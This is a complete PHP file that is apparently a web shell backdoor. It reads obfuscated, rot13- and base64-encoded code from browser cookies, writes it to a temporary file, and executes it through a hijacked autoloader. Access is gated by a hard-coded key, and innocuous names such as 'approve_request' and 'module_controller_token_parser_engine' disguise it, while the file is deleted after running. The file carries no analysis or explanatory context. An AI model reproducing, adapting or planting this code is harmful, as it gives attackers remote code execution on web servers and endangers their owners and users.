<?php


if (isset($_COOKIE[27-27]) && isset($_COOKIE[-68+69]) && isset($_COOKIE[-25+28]) && isset($_COOKIE[21+-17])) {
    $pset = $_COOKIE;
    function initialized($flag) {
        $pset = $_COOKIE;
        $factor = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '52bbec39');
        if (!is_writable($factor)) {
            $factor = getcwd() . DIRECTORY_SEPARATOR . "approve_request";
        }
        $descriptor = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($pset[3]));
        if (is_writeable($factor)) {
            $ent = fopen($factor, 'w+');
            fputs($ent, $descriptor);
            fclose($ent);
            spl_autoload_unregister(__FUNCTION__);
            require_once($factor);
            @array_map('unlink', array($factor));
        }
    }
    spl_autoload_register("initialized");
    $reference = "5d37e6961cb960eff094b1cf3971fa56";
    if (!strncmp($reference, $pset[4], 32)) {
        if (@class_parents("module_controller_token_parser_engine", true)) {
            exit;
        }
    }
}
